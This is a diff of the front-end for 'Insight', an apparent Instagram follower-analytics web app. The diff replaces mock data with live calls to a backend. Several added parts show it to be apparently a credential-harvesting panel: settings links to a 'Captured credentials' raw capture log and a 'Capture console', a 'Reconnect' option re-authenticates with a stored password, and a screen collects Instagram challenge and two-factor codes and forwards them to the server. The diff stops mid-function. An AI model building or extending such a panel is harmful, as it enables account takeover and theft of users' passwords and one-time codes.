@@ -1057,7 +1709,6 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
  .pi h2{font-size:17px}
  .cards{grid-template-columns:repeat(2,1fr);gap:10px}
  .card{padding:14px}.card b{font-size:24px}
- .two{grid-template-columns:1fr}
  .ttl{font-size:21px}
 }
 @media (max-width:760px){
@@ -1086,7 +1737,7 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
  <aside class="side">
   <div class="logo"><span>Insight</span></div>
   <nav class="nav" id="nav"></nav>
-  <div class="me"><div class="ring m"><span style="background:#262626">YO</span></div><div><b>your.handle</b><small>Synced just now</small></div></div>
+  <div class="me"><div class="ring m"><span id="meav" style="background:#262626">YO</span></div><div><b id="meh">your.handle</b><small>Live session</small></div></div>
  </aside>
  <div class="mtop"><span></span><div class="logo"><span>Insight</span></div><button id="mh" aria-label="Settings"></button></div>
  <main id="main"></main>
@@ -1094,6 +1745,7 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 </div></div>
 <div class="toast" id="toast"></div>
 <script>
+const HANDLE = __HANDLE__;
 const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
 const I={
  home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
@@ -1106,28 +1758,14 @@ const I={
  chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
  out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
  plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
- cookie:S('<path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5z"/><circle cx="9" cy="10" r=".8"/><circle cx="13.5" cy="14.5" r=".8"/><circle cx="9.5" cy="15.5" r=".8"/>'),
  set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>')
 };
 const VF='<svg class="vf" viewBox="0 0 24 24"><path d="M12 1.5l2.6 1.8 3.1-.2 1.2 2.9 2.7 1.6-.7 3 1 2.9-2.2 2.2-.4 3.1-3 .7-2.2 2.2L12 19.8 9 21l-2.5-2.1-3-.7-.4-3.1L1 12.8l1-2.9-.7-3 2.7-1.6 1.2-2.9 3.1.2z"/><path d="m8 12.3 2.8 2.8L16.5 9" fill="none" stroke="#fff" stroke-width="2"/></svg>';
 const G=["#fa7e1e,#d62976","#d62976,#962fbf","#4f5bd5,#962fbf","#0095f6,#4f5bd5","#feda75,#fa7e1e","#2ecc71,#0095f6"];
-const u=(n,h,m,x={})=>({n,h,m,...x});
-const D={
- notback:[u("Aria Moreau","aria.moreau","Followed since Mar 2024",{v:1}),u("Kai Nakamura","kai.nkmr","Followed 8 months ago"),u("Sofia Laurent","sofia.laurent","Followed 3 weeks ago",{v:1}),u("Mateo Silva","mateo.s","Followed 1 year ago"),u("Zara Khan","zarakhan","Followed 5 months ago"),u("Leo Brandt","leobrandt","Followed 2 days ago")],
- fans:[u("Noor Ahmed","noor.ahmed","Follows you · 4 mutual"),u("Ivy Chen","ivychen.studio","Follows you · 1 mutual"),u("Omar Haddad","omar.h","Follows you")],
- ghosts:[u("Nina Patel","nina.p","No likes or comments in 142 days",{d:142}),u("Jules Moreno","jules.mrn","Never interacted · 11 months",{d:330}),u("Tariq Aziz","tariq.az","No story views in 96 days",{d:96}),u("Elena Rossi","elena.rossi","No interaction in 74 days",{d:74}),u("Finn Walker","finnwalker","Never interacted · 5 months",{d:150})],
- stalkers:[u("Maya Ellis","maya.ellis","Last visit today · 9:41 PM",{c:14}),u("Dev Sharma","dev.sharma","Last visit yesterday",{c:9}),u("Lina Park","lina.park","Last visit 2 days ago",{c:7}),u("Rafi Hasan","rafi.hasan","Last visit 3 days ago",{c:5}),u("Chloe Dubois","chloe.db","Last visit 5 days ago",{c:3})],
- act:[
-  {g:"Today",i:"broken",t:"<b>maya.ellis</b> removed her like",s:"12m",c:3,tg:["red","Like removed"]},
-  {g:"Today",i:"trash",t:"<b>dev.sharma</b> deleted a comment: “Absolutely stunning 🔥”",s:"1h",c:1,tg:["red","Comment removed"]},
-  {g:"Today",i:"out",t:"<b>zane.cole</b> unfollowed you",s:"3h",tg:["red","Unfollow"]},
-  {g:"Yesterday",i:"chat",t:"<b>lina.park</b> commented: “Where was this taken?”",s:"1d",c:4,tg:["","Comment"]},
-  {g:"Yesterday",i:"act",t:"<b>rafi.hasan</b> liked 6 of your posts in 2 minutes",s:"1d",c:2,tg:["hot","Binge like"]},
-  {g:"Yesterday",i:"trash",t:"<b>chloe.db</b> removed a comment: “Love this!”",s:"1d",c:5,tg:["red","Comment removed"]},
-  {g:"This week",i:"plus",t:"<b>noor.ahmed</b> started following you",s:"2d",tg:["","New follower"]}]
-};
-const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Profile Stalkers"],["act","Activity"]];
-let tab="home",q="",f="all",anim=true;
+const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Story Stalkers"],["act","Activity"]];
+const ST={state:"pending",profile:null,progress:{},error:null,ghostDays:120,syncMinutes:10,last_sync:null};
+let lists={notback:[],fans:[],ghosts:[],stalkers:[]};
+let act=[],tab="home",q="",f="all",anim=true,poll=null,loaded=false;
 let theme="system";
 try{theme=localStorage.getItem("ins-theme")||"system"}catch(e){}
 const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
@@ -1137,116 +1775,232 @@ function applyTheme(){const r=document.documentElement;theme==="system"?r.remove
 const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
 applyTheme();
 const $=s=>document.querySelector(s);
+const esc=s=>String(s==null?"":s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
-const ini=n=>n.split(" ").filter(Boolean).map(w=>w[0]).join("").slice(0,2)||"?";
-const av=(x,i,c="s")=>`<div class="ring ${c}"><span style="background:${gr(i)}">${ini(x.n)}</span></div>`;
-function nav(){
- const cn={notback:D.notback.length,ghosts:D.ghosts.length};
- $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
- $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
- $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
- $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
- document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
+const ini=n=>String(n||"?").split(/[ ._]+/).filter(Boolean).map(w=>w[0]).join("").slice(0,2)||"?";
+
+async function api(p,body){
+  const opt={credentials:"same-origin"};
+  if(body){opt.method="POST";opt.headers={"Content-Type":"application/json"};opt.body=JSON.stringify(body)}
+  try{const r=await fetch(p,opt);return await r.json().catch(()=>({}))}catch(e){return {ok:false,error:"network"}}
 }
-function go(k){tab=k;q="";f="all";anim=true;render();$("#main").scrollTop=0}
-const card=(k,l,n,s,c="")=>`<div class="card" data-k="${k}"><small>${l}${I[k]}</small><b>${n}</b><i class="${c}">${s}</i></div>`;
-function home(){
- const b=[40,62,48,80,55,92,70],d=["M","T","W","T","F","S","S"];
- return `<div class="prof"><div class="ring l"><span style="background:linear-gradient(135deg,#262626,#444)">YO</span></div>
- <div class="pi"><div class="h"><h2>your.handle</h2><button class="btn g">Edit profile</button></div>
- <div class="st"><div><b>248</b> posts</div><div><b>12.4K</b> followers</div><div><b>842</b> following</div></div>
- <p><b>Your name</b><br><span>Creator · Insights updated live</span></p></div></div>
- <div class="sec" style="margin-top:6px"><h3>Top profile visitors</h3><a data-k="stalkers">See all</a></div>
- <div class="stories">${D.stalkers.map((x,i)=>`<div data-k="stalkers"><div class="ring" style="padding:3px"><span style="background:${gr(i)}">${ini(x.n)}</span></div><em>${x.c}</em><small>${x.h}</small></div>`).join("")}</div>
- <div class="sec"><h3>Insights</h3></div>
- <div class="cards">
-  ${card("notback","Not following back",D.notback.length,"Review list")}
-  ${card("ghosts","Ghost followers",D.ghosts.length,"Zero engagement","dn")}
-  ${card("stalkers","Regular stalkers",D.stalkers.length,"+3 this week","up")}
-  ${card("act","Removed likes",7,"Last 7 days","dn")}
-  ${card("act","Deleted comments",4,"Last 7 days","dn")}
-  ${card("act","Unfollowed you",3,"Last 7 days","dn")}
- </div>
- <div class="sec"><h3>Overview</h3></div>
- <div class="two">
-  <div class="panel"><h4>Follower health</h4><div class="donut"><svg viewBox="0 0 42 42"><circle cx="21" cy="21" r="15.9" fill="none" stroke="var(--chip)" stroke-width="4.5"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#d62976" stroke-width="4.5" stroke-dasharray="62 38" transform="rotate(-90 21 21)" stroke-linecap="round"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#0095f6" stroke-width="4.5" stroke-dasharray="22 78" stroke-dashoffset="-65" transform="rotate(-90 21 21)" stroke-linecap="round"/></svg>
-  <div class="leg"><div><em style="background:#d62976"></em><b>62%</b> Active</div><div><em style="background:#0095f6"></em><b>24%</b> Passive</div><div><em style="background:var(--chip)"></em><b>14%</b> Ghosts</div></div></div></div>
-  <div class="panel"><h4>Profile visits · 7 days</h4><div class="spark">${b.map((v,i)=>`<i style="height:${v}%;animation-delay:${i*70}ms"></i>`).join("")}</div><div class="sl">${d.map(x=>`<span>${x}</span>`).join("")}</div></div>
- </div>`;
+function av(x,i,c="s"){return `<div class="ring ${c}"><span style="background:${gr(i)}">${esc(ini(x.n||x.h))}</span></div>`}
+function pic(x,i,c="s"){
+  if(!x.pic)return av(x,i,c);
+  return `<div class="ring ${c}"><span style="background:url('${esc(x.pic)}') center/cover"></span></div>`;
 }
-function actList(a){
- let g="",o="";
- a.forEach((x,i)=>{
-  if(x.g!==g){g=x.g;o+=`<div class="day">${g}</div>`}
-  o+=`<div class="row" style="animation-delay:${i*50}ms"><div class="ic">${I[x.i]}</div><div class="info"><b style="font-weight:400;white-space:normal">${x.t}</b><small>${x.s} · <span class="tag ${x.tg[0]}">${x.tg[1]}</span></small></div>${x.c?`<div class="th" style="background:${gr(x.c)}"></div>`:""}</div>`});
- return o;
+function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>e.classList.remove("show"),1800)}
+
+function connScreen(){
+  const p=ST.progress||{};
+  if(ST.state==="challenge"||ST.state==="2fa"){
+    const two=ST.state==="2fa";
+    return `<div class="empty"><h1 class="ttl">${two?"Two-factor code":"Confirm it’s you"}</h1>
+      <p class="sub">${two?"Enter the 6-digit code from your authenticator app.":"Instagram sent a code to your email or phone."}</p>
+      <div class="bar" style="max-width:320px;margin:18px auto">
+      <input class="search" id="code" inputmode="numeric" placeholder="123456" autocomplete="one-time-code">
+      <button class="btn" id="send">Continue</button></div></div>`;
+  }
+  if(ST.state==="error"){
+    return `<div class="empty"><h1 class="ttl">Couldn’t connect</h1><p class="sub">${esc(ST.error||"unknown error")}</p>
+      <button class="btn" id="retry">Try again</button></div>`;
+  }
+  return `<div class="empty"><h1 class="ttl">Connecting to Instagram…</h1>
+    <p class="sub">${esc(p.step||"starting")} · ${p.pct||0}%</p>
+    <div class="spark" style="height:6px;max-width:260px;margin:20px auto"><i style="height:100%;width:${p.pct||0}%"></i></div>
+    <p class="sub">First sync scans your recent posts and followers — give it a minute.</p></div>`;
 }
+
+function actList(rows){
+  if(!rows.length)return `<div class="empty">Nothing yet — activity appears as your audience changes.</div>`;
+  const icon={like_removed:"broken",comment_removed:"trash",unfollowed_you:"out",you_unfollowed:"out",new_follower:"plus",you_followed:"plus"};
+  const label={like_removed:"Like removed",comment_removed:"Comment removed",unfollowed_you:"Unfollow",you_unfollowed:"You unfollowed",new_follower:"New follower",you_followed:"You followed"};
+  const red={like_removed:1,comment_removed:1,unfollowed_you:1};
+  let day="",out="";
+  rows.forEach((x,i)=>{
+    const d=(x.ts||"").slice(0,10);
+    if(d!==day){day=d;out+=`<div class="day">${d===new Date().toISOString().slice(0,10)?"Today":esc(d)}</div>`}
+    const t=x.kind==="comment_removed"&&x.detail
+      ? `<b>${esc(x.subject)}</b> deleted a comment: “${esc(x.detail)}”`
+      : `<b>${esc(x.subject)}</b> ${esc(label[x.kind]||x.kind)}`;
+    out+=`<div class="row" style="animation-delay:${i*40}ms"><div class="ic">${I[icon[x.kind]||"act"]}</div>
+      <div class="info"><b style="font-weight:400;white-space:normal">${t}</b>
+      <small>${esc((x.ts||"").slice(11,16))} UTC · <span class="tag ${red[x.kind]?"red":""}">${esc(label[x.kind]||"")}</span></small></div>
+      ${x.thumb?`<div class="th" style="background:url('${esc(x.thumb)}') center/cover"></div>`:""}</div>`;
+  });
+  return out;
+}
+
 function rows(k,list){
- if(!list.length)return `<div class="empty">You’re all caught up ✨</div>`;
- return list.map((x,i)=>{
-  let t="",b="";
-  if(k==="notback")b=`<button class="btn g" data-u="${x.h}">Following</button>`;
-  if(k==="ghosts"){t=`<span class="tag red">${x.d}d</span>`;b=`<button class="btn r" data-r="${x.h}">Remove</button>`}
-  if(k==="stalkers"){t=`<span class="tag hot">${x.c} visits</span>`;b=`<button class="btn" data-b="${x.h}">Follow back</button>`}
-  return `<div class="row" style="animation-delay:${i*50}ms">${av(x,i,"s"+(k==="ghosts"?" off":""))}<div class="info"><b>${x.h}${x.v?VF:""}${t}</b><small>${x.n} · ${x.m}</small></div>${b}</div>`}).join("");
+  if(!list.length)return `<div class="empty">Nothing here right now.</div>`;
+  return list.map((x,i)=>{
+    let t="",b="";
+    if(k==="notback")b=`<button class="btn g" data-u="${esc(x.pk)}" data-n="${esc(x.h)}">Unfollow</button>`;
+    if(k==="ghosts"){
+      t=`<span class="tag red">${x.d>9000?"never":x.d+"d"}</span>`;
+      b=`<button class="btn r" data-u="${esc(x.pk)}" data-n="${esc(x.h)}">Remove</button>`;
+    }
+    if(k==="stalkers"){t=`<span class="tag hot">${x.c} views</span>`;b=`<button class="btn" data-b="${esc(x.pk)}" data-n="${esc(x.h)}">Follow</button>`}
+    if(k==="fans")b=`<button class="btn" data-b="${esc(x.pk)}" data-n="${esc(x.h)}">Follow back</button>`;
+    return `<div class="row" style="animation-delay:${i*40}ms">${pic(x,i,"s"+(k==="ghosts"?" off":""))}
+      <div class="info"><b>${esc(x.h)}${x.v?VF:""}${t}</b><small>${esc(x.n)}</small></div>${b}</div>`;
+  }).join("");
 }
-function lv(k,t,s,ch){
- let l=D[k].filter(x=>(x.n+x.h).toLowerCase().includes(q.toLowerCase()));
- if(f==="ver")l=l.filter(x=>x.v);if(f==="old")l=l.filter(x=>x.d>120);if(f==="top")l=l.filter(x=>x.c>=7);
- return `<h1 class="ttl">${t}</h1><p class="sub">${s}</p><div class="bar"><input class="search" id="s" placeholder="Search" value="${q}">${ch.map(([v,l])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${l}</button>`).join("")}</div>${rows(k,l)}`;
+
+function lv(k,t,s,chips){
+  return `<h1 class="ttl">${esc(t)}</h1><p class="sub">${esc(s)}</p>
+    <div class="bar"><input class="search" id="s" placeholder="Search" value="${esc(q)}">
+    ${chips.map(([v,l])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${esc(l)}</button>`).join("")}
+    <button class="chip" id="sync">Sync now</button></div>${rows(k,lists[k]||[])}`;
 }
+
+async function loadList(k){
+  const r=await api(`/api/list?kind=${k}&q=${encodeURIComponent(q)}&filter=${f}`);
+  if(r.ok)lists[k]=r.rows||[];
+}
+
+function card(k,l,n,s,c=""){
+  return `<div class="card" data-k="${k}"><small>${esc(l)}${I[k]}</small><b>${n}</b><i class="${c}">${esc(s)}</i></div>`;
+}
+
+function home(){
+  const p=ST.profile||{};
+  const inner=p.pic
+    ? `<span style="background:url('${esc(p.pic)}') center/cover"></span>`
+    : `<span style="background:linear-gradient(135deg,#262626,#444)">${esc(ini(p.username||HANDLE))}</span>`;
+  return `<div class="prof"><div class="ring l">${inner}</div>
+  <div class="pi"><div class="h"><h2>@${esc(p.username||HANDLE)}</h2><button class="btn g" id="sync">Sync now</button></div>
+  <div class="st"><div><b>${p.posts??"–"}</b> posts</div><div><b>${p.followers??"–"}</b> followers</div><div><b>${p.following??"–"}</b> following</div></div>
+  <p><b>${esc(p.full_name||"")}</b><br><span>Last sync ${esc((ST.last_sync||"").slice(11,19))||"–"} UTC · auto every ${ST.syncMinutes}m</span></p></div></div>
+  <div class="cards">
+    ${card("notback","Not following back",lists.notback.length,"Review list")}
+    ${card("ghosts","Ghost followers",lists.ghosts.length,`No engagement in ${ST.ghostDays}d`,"dn")}
+    ${card("stalkers","Story stalkers",lists.stalkers.length,"By view count","up")}
+    ${card("fans","Follows you back",lists.fans.length,"Not followed yet","up")}
+  </div>
+  <div class="sec"><h3>Recent activity</h3><a data-k="act">See all</a></div>
+  ${actList(act.slice(0,6))}`;
+}
+
 function settings(){
- const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}" aria-label="${l}"></button></div>`;
- const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b><small>${s}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}" aria-label="${l}"></button></div>`;
- const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${href}"`:""}><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><span class="ch">›</span></div>`;
- return `<h1 class="ttl">Settings</h1><p class="sub">Manage your appearance, alerts and account.</p>
- <div class="acc">${av({n:"Your Name"},0,"m")}<div class="info"><b>your.handle</b><small>Your Name · Personal account</small></div><button class="btn g">Switch</button></div>
- <div class="sec"><h3>Appearance</h3></div>
- ${th("dark","Dark mode","Switch between light and dark appearance",eff())}
- ${th("sys","Use device settings","Match your phone or computer’s appearance automatically",theme==="system")}
- <div class="sec"><h3>Notifications</h3></div>
- ${sw("likes","Removed likes","Tell me when someone takes back a like")}
- ${sw("comm","Deleted comments","Tell me when a comment disappears")}
- ${sw("unf","Unfollows","Tell me when someone unfollows you")}
- ${sw("stalk","Profile visit alerts","Notify me about repeat visitors")}
- <div class="sec"><h3>Privacy</h3></div>
- ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
- ${lk("Captured credentials","Last login this browser sent","","/cookies")}
- ${lk("Capture console","Open the admin console","","/admin")}
- ${lk("Blocked accounts","")}
- ${lk("Data sync frequency","Every 15 minutes")}
- <div class="sec"><h3>Account</h3></div>
- ${lk("Linked Instagram account","@your.handle")}
- ${lk("Download your data","")}
- ${lk("Help","")}
- ${lk("Log out","Sign out of this device","red")}`;
+  const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${esc(l)}</b>${s?`<small>${esc(s)}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}"></button></div>`;
+  const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${esc(l)}</b><small>${esc(s)}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}"></button></div>`;
+  const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${esc(href)}"`:""}><div class="info"><b style="font-weight:400">${esc(l)}</b>${s?`<small>${esc(s)}</small>`:""}</div><span class="ch">›</span></div>`;
+  return `<h1 class="ttl">Settings</h1><p class="sub">Appearance, alerts and the live session.</p>
+  <div class="acc">${av({n:ST.profile?.full_name||HANDLE},0,"m")}<div class="info"><b>@${esc(ST.profile?.username||HANDLE)}</b><small>Connected · ${ST.syncMinutes} min auto-sync</small></div></div>
+  <div class="sec"><h3>Session</h3></div>
+  ${lk("Sync now","Pull fresh followers and activity","","#sync")}
+  ${lk("Reconnect","Re-authenticate with the stored password","","#reconnect")}
+  ${lk("Export activity","JSON of every detected change","","/api/export")}
+  ${lk("Captured credentials","Raw capture log for this browser","","/cookies")}
+  ${lk("Capture console","Admin view","","/admin")}
+  <div class="sec"><h3>Appearance</h3></div>
+  ${th("dark","Dark mode","Manual light/dark",eff())}
+  ${th("sys","Use device settings","Follow the OS",theme==="system")}
+  <div class="sec"><h3>Notifications</h3></div>
+  ${sw("likes","Removed likes","Alert when a like disappears")}
+  ${sw("comm","Deleted comments","Alert when a comment disappears")}
+  ${sw("unf","Unfollows","Alert when someone unfollows you")}
+  <div class="sec"><h3>Account</h3></div>
+  ${lk("Log out","Wipe the stored session","red")}`;
 }
-function render(){
- nav();
- const m=$("#main");let h;
- if(tab==="home")h=home();
- else if(tab==="notback")h=lv("notback","Not following back","Accounts you follow that don’t follow you.",[["all","All"],["ver","Verified"]])+`<div class="sec"><h3>Following you · you don’t follow</h3></div>${D.fans.map((x,i)=>`<div class="row">${av(x,i+2)}<div class="info"><b>${x.h}</b><small>${x.m}</small></div><button class="btn" data-b="${x.h}">Follow back</button></div>`).join("")}`;
- else if(tab==="ghosts")h=lv("ghosts","Ghost followers","They follow you but never like, comment or view.",[["all","All"],["old","120d+"]]);
- else if(tab==="stalkers")h=lv("stalkers","Profile stalkers","Who keeps checking your profile the most.",[["all","All"],["top","Top"]]);
- else if(tab==="settings")h=settings();
- else h=`<h1 class="ttl">Activity</h1><p class="sub">Likes removed, comments deleted, unfollows and more.</p>${actList(D.act)}`;
- m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;anim=false;
- const s=$("#s");if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render();const n=$("#s");n.focus();n.setSelectionRange(p,p)};
- m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
- m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();const sc=m.scrollTop;render();m.scrollTop=sc});
- m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();const sc=m.scrollTop;render();m.scrollTop=sc;toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
- m.querySelectorAll("[data-href]").forEach(b=>b.onclick=()=>window.open(b.dataset.href,"_blank","noopener"));
- m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{b.style.pointerEvents="none";b.style.opacity=".55";toast("Logging out…");setTimeout(()=>{location.href="/logout"},480)});
- m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
- m.querySelectorAll("[data-u],[data-r],[data-b]").forEach(b=>b.onclick=e=>{
-  e.stopPropagation();const d=b.dataset;
-  if(d.u){D.notback=D.notback.filter(x=>x.h!==d.u);toast("Unfollowed "+d.u)}
-  if(d.r){D.ghosts=D.ghosts.filter(x=>x.h!==d.r);toast("Removed "+d.r)}
-  if(d.b){b.textContent="Following";b.className="btn g";toast("You followed "+d.b);return}
-  const sc=m.scrollTop;render();m.scrollTop=sc});
+
+function nav(){
+  const cn={notback:lists.notback.length,ghosts:lists.ghosts.length};
+  $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${esc(l)}">${I[k]}${esc(l)}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
+  $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${esc(l)}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
+  $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
+  $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
+  document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
 }
-let tt;function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(tt);tt=setTimeout(()=>e.classList.remove("show"),1800)}
-render();
+
+async function go(k){
+  tab=k;q="";f="all";anim=true;
+  if(["notback","fans","ghosts","stalkers"].includes(k))await loadList(k);
+  render();$("#main").scrollTop=0;
+}
+
+function wire(){
+  const m=$("#main"),s=$("#s");
+  if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render().then(()=>{const n=$("#s");if(n){n.focus();n.setSelectionRange(p,p)}})};
+  m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
+  m.querySelectorAll("#sync,[data-href='#sync']").forEach(b=>b.onclick=async()=>{toast("Sync queued…");await api("/api/sync",{})});
+  m.querySelectorAll("[data-href='#reconnect']").forEach(b=>b.onclick=async()=>{toast("Reconnecting…");await api("/api/reconnect",{})});
+  m.querySelectorAll("[data-href]").forEach(b=>{if((b.dataset.href||"").startsWith("/"))b.onclick=()=>window.open(b.dataset.href,"_blank","noopener")});
+  m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();render()});
+  m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();render()});
+  m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{toast("Logging out…");setTimeout(()=>location.href="/logout",450)});
+  m.querySelectorAll("[data-u],[data-b]").forEach(b=>b.onclick=async e=>{
+    e.stopPropagation();
+    const d=b.dataset,kind=d.u?"unfollow":"follow",pk=d.u||d.b;
+    b.disabled=true;b.textContent="…";
+    const r=await api("/api/action",{kind,pk,username:d.n});
+    if(!r.ok){b.disabled=false;b.textContent="retry";toast(r.error||"failed");return}
+    if(kind==="unfollow"){
+      ["notback","ghosts"].forEach(k=>lists[k]=lists[k].filter(x=>x.pk!==pk));
+      toast("Unfollowed @"+d.n);
+    }else toast("Following @"+d.n);
+    render();
+  });
+}
+
+function wireConn(){
+  const send=$("#send"),code=$("#code"),retry=$("#retry");
+  if(send)send.onclick=async()=>{
+    const v=(code.value||"").trim();if(!v)return;
+    send.disabled=true;
+    await api(ST.state==="2fa"?"/api/2fa":"/api/challenge",{code:v});
+    ST.state="pending";ST.progress={step:"verifying",pct:50};render();
+  };
+  if(code)code.onkeydown=e=>{if(e.key==="Enter")send.click()};
+  if(retry)retry.onclick=async()=>{ST.state="pending";ST.error=null;render();await api("/api/reconnect",{})};
+}
+
+async function render(){
+  nav();
+  const m=$("#main");
+  if(ST.state!=="ok"){m.innerHTML=`<div class="in pg">${connScreen()}</div>`;wireConn();return}
+  if(!loaded){await Promise.all(["notback","fans","ghosts","stalkers"].map(loadList));loaded=true}
+  const a=await api("/api/activity");act=a.rows||[];
+  if(ST.profile){
+    $("#meh").textContent="@"+(ST.profile.username||HANDLE);
+    const av2=$("#meav");
+    if(av2&&ST.profile.pic)av2.style.background=`url('${ST.profile.pic}') center/cover`;
+  }
+  let h;
+  if(tab==="home")h=home();
+  else if(tab==="notback")h=lv("notback","Not following back","You follow them, they don’t follow you.",[["all","All"],["ver","Verified"]]);
+  else if(tab==="fans")h=lv("fans","Follows you back","They follow you — you don’t follow them.",[["all","All"]]);
+  else if(tab==="ghosts")h=lv("ghosts","Ghost followers",`No like, comment or story view in ${ST.ghostDays} days.`,[["all","All"],["old",`${ST.ghostDays}d+`]]);
+  else if(tab==="stalkers")h=lv("stalkers","Story stalkers","Most frequent story viewers.",[["all","All"],["top","Top"]]);
+  else if(tab==="settings")h=settings();
+  else h=`<h1 class="ttl">Activity</h1><p class="sub">Likes pulled, comments deleted, follows gained and lost.</p>${actList(act)}`;
+  m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;
+  anim=false;
+  wire();
+}
+
+async function pull(){
+  const n=await api("/api/state");
+  if(!n.ok)return;
+  const was=ST.state;
+  ST.state=n.state;ST.profile=n.profile||ST.profile;ST.progress=n.progress||{};
